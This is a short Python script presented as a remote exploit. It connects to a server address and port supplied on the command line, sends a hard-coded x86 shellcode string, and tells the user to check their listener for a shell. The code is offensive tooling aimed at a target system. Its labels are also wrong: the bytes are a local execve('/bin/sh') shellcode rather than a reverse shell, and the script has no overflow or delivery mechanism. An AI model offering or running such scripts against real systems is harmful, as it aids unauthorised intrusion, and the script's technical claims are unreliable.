import socket
import sys

def exploit(server_ip, server_port):
    # Define the reverse shell payload (replace with actual shellcode)
    reverse_shell_payload = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

    # Create a socket object
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    try:
        # Connect to the server
        s.connect((server_ip, server_port))
        
        # Send the reverse shell payload to the server
        print("[*] Sending reverse shell payload to server...")
        s.send(reverse_shell_payload)
        
        print("[+] Payload sent successfully! Check your listener for the shell.")

    except Exception as e:
        print("[-] An error occurred:", e)
    
    finally:
        # Close the socket connection
        s.close()

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: {} <server_ip> <server_port>".format(sys.argv[0]))
        sys.exit(1)
    
    server_ip = sys.argv[1]
    server_port = int(sys.argv[2])
    
    exploit(server_ip, server_port)
